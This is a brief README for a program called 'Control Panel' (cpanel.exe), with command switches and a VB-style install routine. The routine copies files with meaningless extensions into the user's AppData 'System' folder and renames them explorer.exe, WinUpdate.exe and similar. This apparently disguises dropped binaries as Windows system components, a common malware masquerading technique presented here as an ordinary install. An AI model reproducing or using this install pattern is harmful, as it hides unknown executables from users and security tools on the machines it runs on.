Control Panel
=========================

```
cpanel.exe /local - Shows config from local files in "./Files" directory
cpanel.exe /install - Executes install NPS
```

### Install Process

	FileCopy App.Path & "\Files\NILS.ISS", GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe"   'explorer.exe
	FileCopy App.Path & "\Files\AS4T.CVF", GetSpecialFolderA(CSIDL_APPDATA) & "System\WinUpdate.exe"     'winUpdate.exe
	FileCopy App.Path & "\Files\files.CAB", GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp"
	FileCopy App.Path & "\Files\tafr.INL", GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP"